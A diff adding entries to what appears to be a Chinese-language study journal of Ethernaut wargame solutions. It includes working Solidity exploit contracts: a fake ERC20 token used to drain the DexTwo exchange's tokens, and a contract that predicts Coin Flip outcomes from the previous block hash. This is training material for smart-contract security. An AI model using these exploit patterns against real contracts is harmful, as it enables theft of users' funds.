@@ -209,5 +209,63 @@ contract BuyerImpl {
 这题的 getSwapPrice 方法有问题，会用交易前的价格执行整个交易，实际交易时会有滑点问题。
 只需要不断用一种资产换另一种资产，再用另一种资产换回原来资产这种方式，就能消耗完 Dex 中所有代表
 
+### 2024.09.09
+#### Ethernaut - DexTwo
+根据题目提示，能够发现 Dex 合约在进行swap时，没有判断交易的是否是题目创建的两个合约。
+我们能够构建一个有问题的合约，去把 Dex 创建的两个代币合约中的代币偷出来。
+实例地址：0xEd4F4dDf2D09A4c3b98bC8176970329a9cA4943E
+```
+contract SwappableTokenTwo is ERC20 {
+    address private _dex;
+
+    constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply)
+        ERC20(name, symbol)
+    {
+        _mint(msg.sender, initialSupply);
+        _dex = dexInstance;
+    }
+
+    function approve(address owner, address spender, uint256 amount) public {
+        require(owner != _dex, "InvalidApprover");
+        super._approve(owner, spender, amount);
+    }
+
+    function balanceOf(address account) public pure override  returns (uint256) {
+        return uint256(1);
+    }
+}
+```
+
+### 2024.09.10
+#### Ethernaut - Coin Flip
+可以部署一个合约，提前算出这个回合的值，然后再调用目标合约
+实例地址：0xC4942cA0C3cF779AE244026Bd5768a79bC93FA91
+```
+contract AttackCoinFlip {
+    CoinFlip flip;
+    uint256 lastHash;
+    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+    constructor(address _flip) {
+        flip = CoinFlip(_flip);
+    }
+
+    function attack() public {
+        uint256 blockValue = uint256(blockhash(block.number - 1));
+        if (lastHash == blockValue) {
+            revert();
+        }
+
+        lastHash = blockValue;
+        uint256 coinFlip = blockValue / FACTOR;
+        bool side = coinFlip == 1 ? true : false;
+        bool res = flip.flip(side);
+        if (!res) {
+            revert();
+        }
+    }
+}
+```
+
 
 <!-- Content_END -->
